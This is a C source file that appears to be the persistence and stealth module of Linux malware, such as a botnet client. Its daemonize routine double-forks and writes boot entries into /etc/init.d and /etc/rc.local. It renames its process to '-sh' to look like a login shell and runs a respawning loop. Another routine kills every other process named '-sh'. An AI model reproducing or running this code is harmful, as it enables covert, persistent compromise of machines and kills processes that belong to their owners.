#define _GNU_SOURCE

#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/stat.h>
#include <dirent.h>
#include <ctype.h>

void cleanup_old_processes() {
    DIR *proc = opendir("/proc");
    if (!proc) return;
    struct dirent *ent;
    char comm_path[256], comm_buf[64];
    while ((ent = readdir(proc))) {
        if (!isdigit(ent->d_name[0])) continue;
        snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", ent->d_name);
        int fd = open(comm_path, O_RDONLY);
        if (fd != -1) {
            ssize_t r = read(fd, comm_buf, sizeof(comm_buf)-1);
            if (r > 0) {
                comm_buf[r] = 0;
                char *nl = strchr(comm_buf, '\n');
                if (nl) *nl = 0;
                if (strcmp(comm_buf, "-sh") == 0) {
                    pid_t other_pid = atoi(ent->d_name);
                    if (other_pid != getpid()) {
                        kill(other_pid, SIGKILL);
                    }
                }
            }
            close(fd);
        }
    }
    closedir(proc);
}

void util_strcpy(char *dst, const char *src) {
    while ((*dst++ = *src++));
}

void daemonize(int argc, char **argv)
{
    srand(time(NULL));
    cleanup_old_processes();
    pid_t pid;
    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    setsid();
    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    int etc_writable = (access("/etc/init.d", W_OK) == 0);
    if (etc_writable) {
        FILE *initf = fopen("/etc/init.d/xs.main", "w");
        if (initf) {
            fprintf(initf, "#!/bin/sh\n%s %s\n", argv[0], argc > 1 ? argv[1] : "");
            fclose(initf);
            chmod("/etc/init.d/xs.main", 0755);
        }
    }

    int rc_local_writable = (access("/etc/rc.local", W_OK) == 0);
    if (rc_local_writable) {
        FILE *rcf = fopen("/etc/rc.local", "a");
        if (rcf) {
            if (access(argv[0], X_OK) == 0) {
                fprintf(rcf, "%s %s\n", argv[0], argc > 1 ? argv[1] : "");
            }
            fclose(rcf);
        }
    }

    size_t shlen = strlen("-sh");
    memset(argv[0], 0, strlen(argv[0]));
    memcpy(argv[0], "-sh", shlen);
    prctl(PR_SET_NAME, "-sh");



    while (1) {
        pid = fork();
        if (pid == 0) return;
        if (pid > 0) {
            int status;
            waitpid(pid, &status, 0);
            if (WIFEXITED(status)) {
                int exit_code = WEXITSTATUS(status);
                if (exit_code == 42) {
                    _exit(42);
                }
                if (exit_code == 0) {
                    sleep(5);
                } else {
                    sleep(5);
                }
            } else {
                sleep(5);
            }
        }
    }
}
